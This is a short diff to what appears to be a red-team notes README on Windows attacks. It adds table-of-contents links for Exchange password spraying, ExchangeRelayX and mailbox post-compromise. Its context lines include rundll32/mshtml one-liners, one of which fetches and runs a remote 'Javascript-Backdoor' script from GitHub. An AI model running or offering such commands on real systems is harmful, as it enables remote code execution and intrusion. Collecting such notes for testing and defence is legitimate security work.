@@ -55,6 +55,9 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-scf-file-attack">SCF File Attack</a>
       * <a href="#-ntlm-relay">NTLM-Relay</a>
       * <a href="#-priv-exchange">Priv Exchange</a>
+      * <a href="#-exchange-password-spray">Exchange Password Spray</a>
+      * <a href="#-exchangerelayx">ExchangeRelayX</a>
+      * <a href="#-exchange-mailbox-post-compromise">Exchange Mailbox Post-Compromise</a>
       * <a href="#-crackmapexec">CrackMapExec</a>
       * <a href="#-mail-sniper">Mail Sniper</a>
       * <a href="#-kerberos-stuff">Kerberos Stuff</a>
@@ -2344,4 +2347,3 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
 ```
-
